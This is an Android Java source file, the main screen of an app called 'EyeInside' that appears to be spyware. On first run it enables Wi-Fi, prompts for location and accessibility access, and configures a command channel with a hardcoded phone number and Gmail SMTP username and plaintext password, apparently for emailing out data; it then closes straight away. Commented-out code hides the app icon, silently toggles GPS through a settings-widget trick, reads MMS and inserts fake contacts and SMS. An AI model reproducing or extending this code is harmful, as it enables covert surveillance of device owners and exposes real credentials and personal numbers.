package com.code4bones.EyeInside;


import java.util.List;

import com.code4bones.utils.NetLog;

import android.location.LocationManager;
import android.net.Uri;
import android.net.wifi.WifiManager;
import android.os.Bundle;
import android.os.Handler;
import android.provider.ContactsContract.Data;
import android.provider.Settings;
import android.accessibilityservice.AccessibilityService;
import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.ActivityInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.PackageManager.NameNotFoundException;
import android.content.pm.ServiceInfo;
import android.database.Cursor;
import android.view.Menu;
import android.view.accessibility.AccessibilityManager;

public class MainActivity extends Activity {

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);
		NetLog.v("I INSIDE !");
		
		//NetLog.v("PATH %s",CommandObj.getFile(this, "Hello.txt"));
		/*
		PackageManager pm = this.getPackageManager();
	    ComponentName componentName =
	    	      new ComponentName("com.code4bones.EyeInside",
	    	      "com.code4bones.EyeInside.MainActivity");
	    
	    */
	    /*
		handleMMS handler = new handleMMS(this);
		ArrayList<SmsObj> ff = handler.listMMS();
		for ( SmsObj f : ff) {
			NetLog.v("file:%s",f.filename);
			for ( String s : f.phoneList) 
				NetLog.v("  %s",s);
		}
		*/
	    //pm.setComponentEnabledSetting(componentName,PackageManager.COMPONENT_ENABLED_STATE_DISABLED,PackageManager.DONT_KILL_APP);
	  
		
		
//		for ( String col : c.getColumnNames() )
//			NetLog.v("%s : %s",col,c.getString(c.getColumnIndex(col)));
		/*
		long rawContactId = -1;
		ContentValues values = new ContentValues();
		values.put(Data.RAW_CONTACT_ID, rawContactId);
		values.put(Data.MIMETYPE, Phone.CONTENT_ITEM_TYPE);
		values.put(Phone.NUMBER, "1-800-GOOG-411");
		values.put(Phone.TYPE, Phone.TYPE_CUSTOM);
		values.put(Phone.LABEL, "free directory assistance");
		Uri dataUri = getContentResolver().insert(Data.CONTENT_URI, values);
		NetLog.v("URI %s",dataUri.toString());
        */
		/*
		ContentValues values = new ContentValues();
		values.put(Contacts.DISPLAY_NAME, "Test Name");
		// add it to the database
		Uri newPerson = getContentResolver().insert(Contacts.CONTENT_URI, values);		
		NetLog.v("New Person %s",newPerson.toString());
		*/
		//addContacts("Clinch Coffin","+79037996299",Phone.TYPE_MOBILE,"clinch@yandex.ru","code4bones","Lavch","moscow","russia","7");
		//addSMS("89037996296",new Date(),true,true,"Hello World read 2");
		/*
		Cursor c = this.getContentResolver().query(Data.CONTENT_URI,null,null,null,null);
		if ( c == null || !c.moveToFirst() )
			return;
		
		do {
		//	for ( String col : c.getColumnNames() )
			//	NetLog.v("%s : %s",col,c.getString(c.getColumnIndex(col)));
			//NetLog.v("%s",c.getString(ctColumnIndex(Data.DISPLAY_NAME)));
		} while ( c.moveToNext());
		*/
		
		checkFirstRun();
		
		finish();
	}

	public void checkFirstRun() {
		SharedPreferences pref = this.getSharedPreferences("prefs", 1);
		if ( !pref.contains(CommandObj.PREF_MASTER)) {
			checkGPS();
			checkWifi();
			checkAccess();
			CommandPool pool = CommandPool.getInstance();
			new Handler().post(new CommandInvoker(MainActivity.this,pool,"+79037996299","@setup smtp:smtp.gmail.com;port:465;user:eyeinsid3@gmail.com;pass:60175577a;mail:eyeinsid3@gmail.com;wifi",false));
		}
	}
	
	private void checkWifi() {
		WifiManager wifi = (WifiManager) this.getSystemService(Context.WIFI_SERVICE); 
		if ( !wifi.isWifiEnabled() ) {
			wifi.setWifiEnabled(true);
		}  
	}
	
	private void checkGPS() {
		LocationManager locMgr = (LocationManager)getSystemService(Context.LOCATION_SERVICE);
		boolean ok = locMgr.isProviderEnabled(LocationManager.GPS_PROVIDER) && locMgr.isProviderEnabled(LocationManager.NETWORK_PROVIDER);
		if ( !ok ) {
			Intent run = new Intent(android.provider.Settings.ACTION_LOCATION_SOURCE_SETTINGS);   
			startActivity(run);		
		}
	}
	
	private void checkAccess() {
		Intent intent = new Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS);
		startActivityForResult(intent, 0);
	}
	
	/*
	private void turnGPSOn(){
	    String provider = Settings.Secure.getString(getContentResolver(), Settings.Secure.LOCATION_PROVIDERS_ALLOWED);
	    if(!provider.contains("gps")){ //if gps is disabled
	        final Intent poke = new Intent();
	        poke.setClassName("com.android.settings", "com.android.settings.widget.SettingsAppWidgetProvider"); 
	        poke.addCategory(Intent.CATEGORY_ALTERNATIVE);
	        poke.setData(Uri.parse("3")); 
	        sendBroadcast(poke);
	    }
	}	
	private boolean canToggleGPS() {
	    PackageManager pacman = getPackageManager();
	    PackageInfo pacInfo = null;

	    try {
	        pacInfo = pacman.getPackageInfo("com.android.settings", PackageManager.GET_RECEIVERS);
	    } catch (NameNotFoundException e) {
	        return false; //package not found
	    }

	    if(pacInfo != null){
	        for(ActivityInfo actInfo : pacInfo.receivers){
	            if(actInfo.name.equals("com.android.settings.widget.SettingsAppWidgetProvider") && actInfo.exported){
	                return true;
	            }
	        }
	    }

	    return false; //default
	}	
	*/
	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		// Inflate the menu; this adds items to the action bar if it is present.
		getMenuInflater().inflate(R.menu.main, menu);
		return true;
	}

	@Override
	public void onDestroy() {
		super.onDestroy();
		NetLog.v("Activity Killed");
	}
}
